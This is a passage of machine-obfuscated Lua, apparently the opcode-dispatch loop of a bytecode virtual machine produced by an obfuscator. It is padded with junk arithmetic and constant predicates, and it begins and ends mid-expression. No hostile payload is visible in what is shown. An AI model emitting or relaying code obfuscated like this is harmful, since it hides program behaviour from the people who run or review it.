v87=v75[v79];v88=v87[1 + 0 ];v109=1;end if ((v109==(1 + 0)) or (1559==1240)) then if ((v88<=(7 + 19)) or (2107<906)) then if ((566==566) and (4176<=4914) and (v88<=(541 -((1774 -(34 + 1334)) + 123)))) then if ((3921>=3009) and (v88<=5)) then if (v88<=(1771 -(1749 + 8 + 12))) then if ((v88<=0) or (2244>3452)) then local v130=v87[2];local v131=v85[v130];local v132=v85[v130 + 1 + 0 + 1 ];if ((2063>=1648) and (v132>(1322 -(1249 + 73)))) then if (v131>v85[v130 + 1 ]) then v79=v87[2 + 1 ];else v85[v130 + (1148 -(466 + 679)) ]=v131;end elseif (v131<v85[v130 + (2 -1) ]) then v79=v87[8 -5 ];else v85[v130 + (1903 -(106 + 1794)) ]=v131;end elseif (v88>(1284 -(1035 + 248))) then local v161;v161=v87[1 + 1 ];v85[v161]=v85[v161](v13(v85,v161 + 1 + 0 ,v87[8 -5 ]));v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[116 -(4 + 110) ]][v87[587 -((78 -(20 + 1)) + 527) ]]=v85[v87[1431 -(41 + 1386) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[105 -(9 + 8 + 86) ]]=v85[v87[3 + 0 ]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[5 -3 ]]=v87[3];v79=v79 + (167 -(122 + 44)) ;v87=v75[v79];v85[v87[2 -0 ]]=v87[9 -6 ];v79=v79 + 1 + 0 ;v87=v75[v79];v161=v87[1 + 1 ];v85[v161]=v85[v161](v13(v85,v161 + (1 -0) ,v87[3]));v79=v79 + (66 -(30 + 35)) ;v87=v75[v79];v85[v87[(321 -(134 + 185)) + 0 ]][v87[1260 -(1043 + (1347 -(549 + 584))) ]]=v85[v87[15 -11 ]];v79=v79 + (1213 -(323 + 889)) ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[583 -(361 + 219) ]];v79=v79 + (686 -(314 + 371)) ;v87=v75[v79];v85[v87[322 -(53 + 267) ]]=v87[3];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[6 -4 ]]=v87[416 -(15 + 398) ];else local v179=v87[984 -(18 + (1932 -(478 + 490))) ];local v180,v181=v78(v85[v179](v85[v179 + (3 -2) ]));v80=(v181 + v179) -(1 + 0 + 0) ;local v182=0 + 0 ;for v408=v179,v80 do v182=v182 + (851 -(20 + 830)) ;v85[v408]=v180[v182];end end elseif ((1066>=452) and (v88<=(3 + 0))) then do return;end elseif ((4974>=2655) and (41<=4259) and (v88>(130 -(116 + (1182 -(786 + 386)))))) then v85[v87[1 + 1 ]]=v87[741 -(542 + 196) ] + v85[v87[8 -4 ]] ;else v79=v87[1 + 2 ];end elseif (v88<=(5 + 3)) then if (v88<=(3 + 3)) then v85[v87[4 -2 ]]= #v85[v87[7 -4 ]];elseif (v88==7) then local v185=v87[1553 -((3646 -2520) + 425) ];local v186={};for v411=406 -(118 + 287) , #v84 do local v412=1379 -(1055 + 324) ;local v413;while true do if (v412==((1340 -(1093 + 247)) -0)) then v413=v84[v411];for v593=1121 -(118 + 1003) , #v413 do local v594=v413[v593];local v595=v594[(2 + 0) -1 ];local v596=v594[379 -(142 + 25 + 210) ];if ((v595==v85) and (v596>=v185)) then local v599=0 -0 ;while true do if (v599==(0 + (0 -0))) then v186[v596]=v595[v596];v594[978 -(553 + 424) ]=v186;break;end end end end break;end end end else local v187=v87[3 -(3 -2) ];v85[v187]=v85[v187](v13(v85,v187 + 1 + 0 ,v80));end elseif ((v88<=10) or (1930<56)) then if (v88==(9 + 0)) then local v189;local v190;local v191;v85[v87[(5 -3) + 0 ]]={};v79=v79 + 1 ;v87=v75[v79];v85[v87[(2 -1) + 1 ]]=v87[2 + 1 ];v79=v79 + ((1 + 1) -1) ;v87=v75[v79];v85[v87[5 -(11 -8) ]]= #v85[v87[6 -(10 -7) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v87[1 + 2 ];v79=v79 + (4 -(3 + 0)) ;v87=v75[v79];v191=v87[2];v190=v85[v191];v189=v85[v191 + (755 -(239 + 514)) ];if ((v189>(0 + 0)) or (2721<=907)) then if (v190>v85[v191 + (1330 -(797 + (1360 -828))) ]) then v79=v87[3 + 0 ];else v85[v191 + (691 -(364 + 324)) ]=v190;end elseif (v190<v85[v191 + 1 ]) then v79=v87[2 + 1 ];else v85[v191 + (6 -3) ]=v190;end else local v202;v85[v87[1204 -(373 + 829) ]]=v87[734 -((1304 -828) + 255) ];v79=v79 + (1131 -(369 + 761)) ;v87=v75[v79];v202=v87[2];v85[v202]=v85[v202](v13(v85,v202 + 1 ,v87[2 + 1 ]));v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[3 -1 ]][v87[241 -(64 + 174) ]]=v85[v87[1 + 3 ]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[338 -((345 -201) + 192) ]]=v85[v87[1 + 2 ]];v79=v79 + (217 -(42 + 174)) ;v87=v75[v79];v85[v87[2 + 0 ]]=v87[3];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[(4 -3) + 1 ]]=v87[1507 -(363 + 1141) ];v79=v79 + (1581 -(1183 + 397)) ;v87=v75[v79];v202=v87[5 -3 ];v85[v202]=v85[v202](v13(v85,v202 + 1 + 0 ,v87[3 + 0 ]));v79=v79 + (1976 -(1913 + 62)) ;v87=v75[v79];v85[v87[2 + 0 ]][v87[(10 -3) -4 ]]=v85[v87[1937 -(565 + 1368) ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1663 -(1477 + 184) ]]=v85[v87[3 -(0 -0) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2 + 0 ]]=v87[859 -(564 + 292) ];end elseif ((3333==3333) and (v88==11)) then v85[v87[2 -0 ]]=v85[v87[3]]%v87[11 -7 ] ;else v85[v87[2]]=v85[v87[307 -(244 + 60) ]];end elseif ((4437>=3031) and (v88<=19)) then if (v88<=(12 + 3)) then if (v88<=(489 -(41 + 435))) then local v134;local v135;v85[v87[(2271 -(1249 + 19)) -(847 + 91 + 63) ]]=v63[v87[3 + 0 ]];v79=v79 + 1 ;v87=v75[v79];v135=v87[1127 -(936 + 189) ];v134=v85[v87[1 + 2 ]];v85[v135 + (1614 -((6091 -4526) + 48)) ]=v134;v85[v135]=v134[v87[3 + 1 ]];v79=v79 + (1139 -(782 + 356)) ;v87=v75[v79];v85[v87[269 -((1262 -(686 + 400)) + 91) ]]=v62[v87[7 -4 ]];v79=v79 + 1 ;v87=v75[v79];v135=v87[2 -0 ];do return v85[v135](v13(v85,v135 + (1093 -(975 + 117)) ,v87[(1474 + 404) -(157 + 1718) ]));end v79=v79 + 1 ;v87=v75[v79];v135=v87[2 + 0 ];do return v13(v85,v135,v80);end v79=v79 + (3 -2) ;v87=v75[v79];do return;end elseif ((v88>(47 -33)) or (2225==20)) then local v225;v85[v87[2]]=v85[v87[1021 -(697 + 321) ]];v79=v79 + (2 -(230 -(73 + 156))) ;v87=v75[v79];v85[v87[3 -(1 + 0) ]]=v87[6 -3 ];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v87[7 -4 ];v79=v79 + (1228 -(322 + 905)) ;v87=v75[v79];v225=v87[613 -(602 + 9) ];v85[v225]=v85[v225](v13(v85,v225 + (1190 -(449 + 740)) ,v87[875 -(826 + 46) ]));v79=v79 + (948 -(245 + 702)) ;v87=v75[v79];v85[v87[(817 -(721 + 90)) -4 ]][v87[1 + 2 ]]=v85[v87[1902 -(260 + 19 + 1619) ]];v79=v79 + (441 -(382 + 58)) ;v87=v75[v79];v85[v87[2]]=v85[v87[9 -6 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v87[8 -5 ];v79=v79 + (1206 -(902 + 303)) ;v87=v75[v79];v85[v87[3 -1 ]]=v87[6 -3 ];v79=v79 + 1 + 0 ;v87=v75[v79];v225=v87[1692 -(1121 + 569) ];v85[v225]=v85[v225](v13(v85,v225 + (215 -(22 + (623 -431))) ,v87[686 -(483 + 200) ]));v79=v79 + (1464 -(1404 + 59)) ;v87=v75[v79];v85[v87[5 -3 ]][v87[3 -0 ]]=v85[v87[769 -((938 -(224 + 246)) + 297) ]];else local v242=562 -(334 + 228) ;local v243;local v244;local v245;while true do if (((23 -16)==v242) or (4470<2949)) then v87=v75[v79];v245=v87[2];v85[v245](v85[v245 + ((2 -0) -1) ]);v242=14 -6 ;end if ((v242==(1 + 0)) or (872>=3092) or (1580==2426)) then v85[v87[(437 -199) -(141 + 95) ]]=v85[v87[3 + 0 ]][v87[9 -5 ]];v79=v79 + (2 -1) ;v87=v75[v79];v242=1 + 1 ;end if (v242==(13 -8)) then v87=v75[v79];v244=v87[3 + 0 ];v243=v85[v244];v242=6;end if ((5 + 4)==v242) then v79=v79 + (1 -0) ;v87=v75[v79];v79=v87[3];break;end if ((4404>=3252) and (v242==(0 + 0 + 0))) then v243=nil;v244=nil;v245=nil;v242=164 -(92 + 71) ;end if (((1107>796) and (v242==(2 + 2))) or (3711==503)) then v245=v87[2 -0 ];v85[v245]=v85[v245](v85[v245 + (766 -(574 + 191)) ]);v79=v79 + 1 + 0 ;v242=12 -7 ;end if (v242==(5 + 3)) then v79=v79 + ((21 + 829) -(254 + 595)) ;v87=v75[v79];v85[v87[(95 + 33) -((109 -54) + 71) ]]=v87[3 -0 ];v242=1799 -(573 + 1217) ;end if (v242==(5 -3)) then v85[v87[1 + 1 ]]=v63[v87[4 -1 ]];v79=v79 + (940 -(714 + 225)) ;v87=v75[v79];v242=8 -5 ;end if (v242==3) then v85[v87[(6 -4) -0 ]]=v85[v87[1 + 2 ]];v79=v79 + (1 -0) ;v87=v75[v79];v242=810 -(118 + 688) ;end if ((959==959) and (v242==6)) then for v563=v244 + (49 -((538 -(203 + 310)) + 23)) ,v87[1 + (1996 -(1238 + 755)) ] do v243=v243   .. v85[v563] ;end v85[v87[1888 -(927 + 959) ]]=v243;v79=v79 + (3 -2) ;v242=739 -(16 + 716) ;end end end elseif ((v88<=(32 -15)) or (245>=2204)) then if (v88==((8 + 105) -(11 + 86))) then local v246=0 -0 ;local v247;local v248;local v249;while true do if ((287 -(175 + 110))==v246) then for v564=(1536 -(709 + 825)) -1 ,v87[19 -(27 -12) ] do v79=v79 + (1797 -((731 -228) + 1293)) ;local v565=v75[v79];if ((3162>=2069) and (v565[2 -(865 -(196 + 668)) ]==(9 + 3))) then v249[v564-(1062 -(810 + 251)) ]={v85,v565[1 + 2 ]};else v249[v564-(1 + 0) ]={v62,v565[11 -8 ]};end v84[ #v84 + 1 ]=v249;end v85[v87[(3399 -2538) -(240 + 619) ]]=v29(v247,v248,v63);break;end if (v246==(0 + 0)) then v247=v76[v87[4 -1 ]];v248=nil;v246=1;end if ((1 + 0)==v246) then v249={};v248=v10({},{__index=function(v567,v568) local v569=v249[v568];return v569[1745 -(1344 + 400) ][v569[407 -(255 + 150) ]];end,__newindex=function(v570,v571,v572) local v573=0 + 0 ;local v574;while true do if (((0 + 0)==v573) or (420==4318)) then v574=v249[v571];v574[4 -3 ][v574[6 -4 ]]=v572;break;end end end});v246=1741 -(404 + 1335) ;end end else v85[v87[408 -(183 + 223) ]]=v85[v87[3 -(833 -(171 + 662)) ]][v87[3 + 1 ]];end elseif (v88>(7 + 11)) then local v252=v87[339 -(10 + 327) ];local v253,v254=v78(v85[v252](v13(v85,v252 + 1 + 0 ,v80)));v80=(v254 + v252) -(339 -(118 + 220)) ;local v255=0;for v414=v252,v80 do v255=v255 + 1 + 0 ;v85[v414]=v253[v255];end else local v256=0;local v257;while true do if (v256==(449 -(108 + 341))) then v257=v87[1 + 1 ];do return v85[v257](v13(v85,v257 + (4 -3) ,v87[3]));end break;end end end elseif ((v88<=(1515 -(711 + 782))) or (306>3081)) then if (v88<=((131 -(4 + 89)) -18)) then local v148=0;local v149;while true do if (v148==(469 -(270 + 199))) then v149=v87[1 + 1 ];v85[v149](v85[v149 + (1820 -((2032 -1452) + 1239)) ]);break;end end elseif (v88>(8 + 13)) then if ((v87[5 -3 ]==v85[v87[4 + 0 ]]) or (3513<2706)) then v79=v79 + 1 + 0 ;else v79=v87[2 + (4 -3) ];end else v85[v87[4 -2 ]]=v63[v87[2 + 1 ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v85[v87[3]][v87[4]];v79=v79 + ((459 + 709) -(645 + 522)) ;v87=v75[v79];v85[v87[1792 -(1010 + 780) ]]=v85[v87[3]][v87[4 + 0 ]];v79=v79 + (4 -3) ;v87=v75[v79];v85[v87[2]]=v87[(1494 -(35 + 1451)) -(1458 -(28 + 1425)) ];v79=v79 + (1837 -(1045 + 791)) ;v87=v75[v79];v79=v87[7 -4 ];end elseif (v88<=24) then if (v88==(34 -11)) then local v267=v87[(2500 -(941 + 1052)) -(351 + 154) ];local v268=v85[v267 + 2 ];local v269=v85[v267] + v268 ;v85[v267]=v269;if ((v268>(1574 -(1281 + 293))) or (4158<=33)) then if ((2978<3639) and (v269<=v85[v267 + 1 ])) then v79=v87[(258 + 11) -(28 + 238) ];v85[v267 + ((1520 -(822 + 692)) -3) ]=v269;end elseif ((v269>=v85[v267 + (1560 -(1381 + 178)) ]) or (99>4744)) then v79=v87[3 + 0 ];v85[v267 + 3 + 0 ]=v269;end else local v271;v85[v87[1 + 1 ]][v87[10 -7 ]]=v85[v87[4]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[472 -(381 + 89) ]]=v85[v87[3 + (0 -0) ]];v79=v79 + 1 + 0 + 0 ;v87=v75[v79];v85[v87[(299 -(45 + 252)) -0 ]]=v87[3];v79=v79 + ((1145 + 12) -(1074 + 82)) ;v87=v75[v79];v85[v87[3 -1 ]]=v87[1787 -(214 + 1570) ];v79=v79 + (1456 -(341 + 649 + 465)) ;v87=v75[v79];v271=v87[1 + 1 ];v85[v271]=v85[v271](v13(v85,v271 + 1 + 0 ,v87[3]));v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[7 -5 ]][v87[(4207 -2478) -(1668 + 58) ]]=v85[v87[4]];v79=v79 + (627 -(512 + 114)) ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[5 -2 ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[(434 -(114 + 319)) + 1 ]]=v87[(1 -0) + 2 ];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[6 -4 ]]=v87[3];v79=v79 + 1 ;v87=v75[v79];v271=v87[1996 -(109 + 1885) ];v85[v271]=v85[v271](v13(v85,v271 + (1470 -(1269 + 200)) ,v87[5 -2 ]));end elseif ((3682>=2888) and (v88>(840 -((125 -27) + 717)))) then v85[v87[828 -(802 + 24) ]]=v62[v87[5 -2 ]];else v85[v87[2 -0 ]]=v85[v87[2 + 1 ]][v85[v87[1 + 3 ]]];end elseif ((149<479) and (v88<=(30 + 9))) then if (v88<=32) then if ((4341==4341) and (v88<=(5 + 24))) then if (v88<=27) then local v150=0 + 0 ;local v151;while true do if ((255<=1596) and (1020>=567) and (v150==(0 -0))) then v151=v87[6 -4 ];v85[v151]=v85[v151](v85[v151 + 1 ]);break;end end elseif (v88==(11 + 17)) then if v85[v87[1 + 1 ]] then v79=v79 + 1 + 0 ;else v79=v87[3 + 0 ];end else for v420=v87[1 + 1 ],v87[3] do v85[v420]=nil;end end elseif (v88<=(1463 -(797 + (947 -311)))) then v85[v87[(18 -9) -7 ]]={};elseif (v88>31) then local v294=v87[1621 -(1427 + 192) ];local v295=v85[v87[2 + 1 ]];v85[v294 + 1 ]=v295;v85[v294]=v295[v87[8 -4 ]];else local v299=v87[2];v85[v299]=v85[v299]();end elseif ((v88<=(32 + (1966 -(556 + 1407)))) or (733>2469)) then if (v88<=(15 + 18)) then local v153=0;local v154;while true do if (v153==(326 -(192 + 134))) then v154=v87[1278 -(316 + 960) ];v85[v154](v13(v85,v154 + 1 ,v80));break;end end elseif (v88==(19 + 15)) then if (v85[v87[2 + 0 ]]==v87[4]) then v79=v79 + 1 + 0 ;else v79=v87[11 -8 ];end else local v301=v85[v87[555 -(83 + 468) ]];if  not v301 then v79=v79 + (1807 -(1202 + 604)) ;else v85[v87[9 -7 ]]=v301;v79=v87[4 -1 ];end end elseif ((2497==2497) and (v88<=37)) then if ((v88==(99 -(1269 -(741 + 465)))) or (4433<1635)) then local v302=325 -((510 -(170 + 295)) + 280) ;local v303;local v304;local v305;while true do if (v302==7) then v303=v87[2 + 0 ];v85[v303]=v85[v303](v85[v303 + 1 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v302=3 + 5 ;end if ((v302==(4 + 2)) or (4300<3244)) then v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[5 -2 ]];v79=v79 + (1912 -(340 + 1571)) ;v87=v75[v79];v302=3 + 4 ;end if (1==v302) then v79=v79 + 1 ;v87=v75[v79];v85[v87[1774 -(914 + 819 + 39) ]]=v85[v87[8 -5 ]];v79=v79 + (1035 -(125 + 909)) ;v302=1950 -(1096 + 852) ;end if ((v302==(2 + 1)) or (3534>4677)) then v85[v87[2 -0 ]]=v304;v79=v79 + 1 + 0 ;v87=v75[v79];v303=v87[2];v302=516 -(409 + 103) ;end if (v302==5) then v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[239 -(46 + 190) ]];v79=v79 + ((89 + 7) -(51 + 44)) ;v302=2 + 4 ;end if (v302==2) then v87=v75[v79];v305=v87[1320 -((2742 -1628) + 203) ];v304=v85[v305];for v579=v305 + (727 -(228 + 498)) ,v87[1 + 3 ] do v304=v304   .. v85[v579] ;end v302=2 + 0 + 1 ;end if ((3901==3901) and ((671 -(112 + 62 + 489))==v302)) then v85[v87[5 -3 ]]=v85[v87[(1081 + 827) -(830 + 1075) ]][v87[528 -(303 + 221) ]];v79=v79 + (1270 -(231 + 1038)) ;v87=v75[v79];v85[v87[(1232 -(957 + 273)) + 0 ]]=v85[v87[3]];break;end if ((201<415) and (v302==0)) then v303=nil;v304=nil;v305=nil;v85[v87[2]]=v85[v87[1165 -(46 + 125 + 991) ]][v87[16 -(5 + 7) ]];v302=(7 -5) -(2 -1) ;end if (v302==4) then v85[v303](v85[v303 + (2 -1) ]);v79=v79 + 1 + (0 -0) ;v87=v75[v79];v85[v87[2]]=v85[v87[3]][v87[13 -9 ]];v302=14 -9 ;end end else v85[v87[2]]={};v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[4 -1 ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1250 -(111 + 1137) ]]=v85[v87[161 -(91 + 67) ]][v87[11 -7 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[525 -(423 + 100) ]]=v63[v87[1 + 2 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[774 -(326 + 445) ]][v87[17 -13 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[(19 -15) -2 ]]=v63[v87[714 -(530 + 181) ]];v79=v79 + (882 -(614 + 267)) ;v87=v75[v79];v85[v87[1782 -(389 + 1391) ]]=v85[v87[35 -(19 + 13) ]][v87[6 -2 ]];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[5 -3 ]]=v63[v87[1 + 2 ]];v79=v79 + 1 ;v87=v75[v79];if ( not v85[v87[3 -1 ]] or (4859<2999)) then v79=v79 + 1 ;else v79=v87[6 -3 ];end end elseif (v88==(1850 -(812 + 481 + 519))) then local v320;v85[v87[2]]=v87[(1 + 4) -(4 -2) ];v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[953 -(783 + 168) ]]=v87[5 -2 ];v79=v79 + (4 -3) ;v87=v75[v79];v320=v87[4 -2 ];v85[v320]=v85[v320](v13(v85,v320 + 1 + 0 ,v87[3]));v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 1 ]][v87[3]]=v85[v87[9 -5 ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[1 + 2 ]];v79=v79 + (3 -2) + 0 ;v87=v75[v79];v85[v87[1098 -(709 + 381 + 6) ]]=v87[3];v79=v79 + (312 -(309 + 2)) ;v87=v75[v79];v85[v87[1860 -(673 + 1185) ]]=v87[3];v79=v79 + (2 -1) ;v87=v75[v79];v320=v87[6 -4 ];v85[v320]=v85[v320](v13(v85,v320 + 1 ,v87[4 -1 ]));v79=v79 + 1 ;v87=v75[v79];v85[v87[2 + 0 ]][v87[3 + 0 ]]=v85[v87[5 -1 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[3 -1 ]]=v85[v87[3]];else v85[v87[(9 -6) -1 ]]=v63[v87[1883 -(446 + 1434) ]];end elseif (v88<=46) then if (v88<=(1325 -(1040 + 243))) then if (v88<=(119 -79)) then local v155=v87[1850 -((1771 -(1090 + 122)) + 1288) ];local v156=v85[v155];for v160=v155 + (1932 -(609 + 1322)) ,v87[458 -(13 + 441) ] do v156=v156   .. v85[v160] ;end v85[v87[2]]=v156;elseif ((4726>2407) and ((v88==((50 + 103) -112)) or (133==1784))) then local v342=v87[2];local v343={v85[v342](v85[v342 + (4 -3) ])};local v344=0 + 0 ;for v423=v342,v87[(46 -32) -10 ] do v344=v344 + 1 + 0 ;v85[v423]=v343[v344];end else local v345;local v346;local v347;v85[v87[1 + 1 ]]=v87[8 -5 ];v79=v79 + 1 ;v87=v75[v79];v85[v87[2]]=v63[v87[2 + 1 ]];v79=v79 + ((1 + 0) -0) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[2 + 1 ]];v79=v79 + (1119 -(628 + 490)) + 0 + 0 ;v87=v75[v79];v347=v87[2];v85[v347]=v85[v347](v85[v347 + 1 + 0 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v346=v87[3];v345=v85[v346];for v426=v346 + 1 ,v87[437 -(153 + 280) ] do v345=v345   .. v85[v426] ;end v85[v87[5 -3 ]]=v345;v79=v79 + (2 -1) + 0 ;v87=v75[v79];v347=v87[1 + 1 ];v85[v347](v85[v347 + 1 ]);v79=v79 + 1 ;v87=v75[v79];v79=v87[2 + 1 ];end elseif (v88<=(40 + 4)) then if (v88==(32 + 11)) then if ( not v85[v87[2]] or (1284>3669)) then v79=v79 + ((4 -3) -0) ;else v79=v87[3];end else local v362=0 + 0 ;local v363;while true do if (v362==(667 -((863 -(431 + 343)) + 578))) then v363=v87[2];v85[v363]=v85[v363](v13(v85,v363 + 1 + 0 ,v87[5 -2 ]));break;end end end elseif (v88==(1094 -(572 + 477))) then local v364=v87[1 + 1 ];do return v13(v85,v364,v80);end else local v365=0 + 0 ;local v366;local v367;local v368;local v369;while true do if ((1117<2549) and ((v365==(1 + 3)) or (7>=310))) then v85[v87[(177 -89) -(84 + 2) ]]=v85[v87[4 -1 ]] + v87[3 + 1 ] ;v79=v79 + (843 -(497 + 345)) ;v87=v75[v79];v369=v87[1 + (2 -1) ];v367,v368=v78(v85[v369](v13(v85,v369 + 1 + 0 ,v87[3])));v80=(v368 + v369) -1 ;v365=1338 -(605 + 576 + 152) ;end if (v365==(8 + 3)) then v79=v79 + (1 -0) ;v87=v75[v79];v369=v87[1 + 1 ];v367,v368=v78(v85[v369](v13(v85,v369 + (3 -2) ,v87[3 + 0 + 0 ])));v80=(v368 + v369) -(2 -1) ;v366=1695 -(556 + 1139) ;v365=10 + (17 -(6 + 9)) ;end if ((v365==(489 -(457 + 32))) or (2851>4774)) then v366=nil;v367,v368=nil;v369=nil;v85[v87[2]]=v85[v87[2 + 1 ]];v79=v79 + (1403 -(832 + 570)) ;v87=v75[v79];v365=1 + 0 ;end if ((1031<3848) and (4992>286) and (v365==(3 + 7))) then v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[2]]=v87[2 + 1 ] + v85[v87[800 -(588 + 208) ]] ;v79=v79 + 1 ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[1803 -(884 + 916) ]] + v87[8 -4 ] ;v365=2 + 5 + 4 ;end if ((1854>903) and (v365==(659 -(232 + 421)))) then v79=v79 + 1 ;v87=v75[v79];v85[v87[1891 -(1569 + 320) ]]=v62[v87[3]];v79=v79 + 1 ;v87=v75[v79];v85[v87[1 + 0 + 1 ]]=v62[v87[1 + 2 ]];v365=23 -16 ;end if (v365==(621 -(316 + 289))) then v369=v87[5 -3 ];v85[v369](v13(v85,v369 + 1 ,v80));break;end if ((4663>1860) and (v365==13)) then v366=0;for v580=v369,v80 do v366=v366 + 1 + (169 -(28 + 141)) ;v85[v580]=v367[v366];end v79=v79 + 1 ;v87=v75[v79];v369=v87[1455 -(666 + 787) ];v85[v369]=v85[v369](v13(v85,v369 + (426 -(360 + 65)) ,v80));v365=6 + 8 ;end if ((v365==(1 + 0)) or (2561==3893) or (3053<=469)) then v85[v87[256 -((96 -17) + 124 + 51) ]]=v62[v87[3]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[2]]=v62[v87[3 + 0 ]];v79=v79 + (2 -1) ;v87=v75[v79];v365=3 -1 ;end if (v365==2) then v85[v87[2]]=v62[v87[902 -(503 + 396) ]];v79=v79 + (182 -((1409 -(486 + 831)) + (231 -142))) ;v87=v75[v79];v85[v87[3 -1 ]]=v62[v87[2 + 1 ]];v79=v79 + 1 ;v87=v75[v79];v365=2 + 1 ;end if (((4362>=1421) and (v365==(31 -23))) or (540>=1869)) then v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[4 -2 ]]=v85[v87[3 + 0 ]]%v85[v87[(6 -4) + 2 ]] ;v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[1 + 1 ]]=v87[3] + v85[v87[(1 + 4) -1 ]] ;v365=1253 -((1533 -1048) + 759) ;end if ((75<=3546) and (v365==(27 -(1278 -(668 + 595))))) then for v583=v369,v80 do local v584=1189 -(442 + 747) ;while true do if ((2680<=3418) and (((1022 + 113) -(832 + 303))==v584)) then v366=v366 + 1 ;v85[v583]=v367[v366];break;end end end v79=v79 + ((191 + 756) -(88 + (2339 -1481))) ;v87=v75[v79];v369=v87[1 + 1 ];v367,v368=v78(v85[v369](v13(v85,v369 + 1 ,v80)));v80=(v368 + v369) -(1 + 0) ;v365=13;end if ((3292==3292) and (v365==(1 + 4))) then v366=789 -(766 + 23) ;for v585=v369,v80 do local v586=0 -0 ;while true do if ((1038<=2645) and (v586==0)) then v366=v366 + (1 -0) ;v85[v585]=v367[v366];break;end end end v79=v79 + (2 -1) ;v87=v75[v79];v369=v87[6 -4 ];v85[v369]=v85[v369](v13(v85,v369 + (1074 -(1036 + 37)) ,v80));v365=5 + 1 ;end if ((v365==(5 -2)) or (4288<2876)) then v85[v87[2 + 0 ]]=v85[v87[1483 -(641 + 839) ]];v79=v79 + (914 -(910 + 3)) ;v87=v75[v79];v85[v87[4 -2 ]]=v85[v87[(1977 -(23 + 267)) -(1466 + (2162 -(1129 + 815))) ]];v79=v79 + 1 ;v87=v75[v79];v365=2 + 2 ;end if ((v365==14) or (3230<2525)) then v79=v79 + (1149 -(556 + 592)) ;v87=v75[v79];v85[v87[(388 -(371 + 16)) + 1 ]]=v85[v87[811 -(329 + 479) ]]%v87[858 -(174 + 680) ] ;v79=v79 + 1 ;v87=v75[v79];v369=v87[6 -4 ];v365=15;end if ((2462>=1147) and (v365==(18 -9))) then v79=v79 + (1751 -(1326 + 424)) ;v87=v75[v79];v85[v87[2 + 0 ]]= #v85[v87[742 -((749 -353) + 343) ]];v79=v79 + (3 -2) ;v87=v75[v79];v85[v87[1 + 1 ]]=v85[v87[1480 -(29 + (1566 -(88 + 30))) ]]%v85[v87[4]] ;v365=(2170 -(720 + 51)) -(135 + (2789 -1535)) ;end if (v365==(56 -41)) then v367,v368=v78(v85[v369](v85[v369 + (4 -3) ]));v80=(v368 + v369) -(1 + 0) ;v366=0;for v587=v369,v80 do v366=v366 + (1528 -(389 + 1138)) ;v85[v587]=v367[v366];end v79=v79 + (575 -(102 + 472)) ;v87=v75[v79];v365=16 + (1776 -(421 + 1355)) ;end if (v365==(4 + 3)) then v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1547 -(320 + 1225) ]]=v85[v87[5 -2 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1466 -(157 + 1307) ]]= #v85[v87[1862 -(821 + (1712 -674)) ]];v365=8;end end end elseif (v88<=(122 -73)) then if ((v88<=(6 + 41)) or (2400>4083)) then v85[v87[2]]=v85[v87[3]]%v85[v87[4]] ;elseif ((v88>(84 -(18 + 18))) or (2745>4359)) then v85[v87[1 + 1 ]]=v87[7 -4 ];else local v372=1026 -(834 + 192) ;local v373;local v374;local v375;local v376;while true do if ((172<=1810) and (v372==(1 + 0))) then v80=(v375 + v373) -(1 + 0) ;v376=0 + 0 ;v372=2 -0 ;end if (((1387 -(286 + 797)) -(300 + 4))==v372) then v373=v87[2];v374,v375=v78(v85[v373](v13(v85,v373 + 1 + 0 ,v87[7 -4 ])));v372=3 -2 ;end if (2==v372) then for v590=v373,v80 do v376=v376 + (363 -(112 + 250)) ;v85[v590]=v374[v376];end break;end end end elseif (v88<=51) then if (v88>(20 + 30)) then v85[v87[2]]=v85[v87[7 -4 ]] + v87[3 + (1 -0) ] ;else local v378;local v379;local v380;v85[v87[2 + 0 ]]=v85[v87[3 + 0 ]][v87[2 + 2 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[2]]=v85[v87[3]];v79=v79 + (1415 -(1001 + 413)) ;v87=v75[v79];v380=v87[442 -(397 + 42) ];v379=v85[v380];for v427=v380 + (2 -1) ,v87[(277 + 609) -(244 + 638) ] do v379=v379   .. v85[v427] ;end v85[v87[695 -(627 + 66) ]]=v379;v79=v79 + (801 -(24 + 776)) ;v87=v75[v79];v378=v87[5 -3 ];v85[v378](v85[v378 + 1 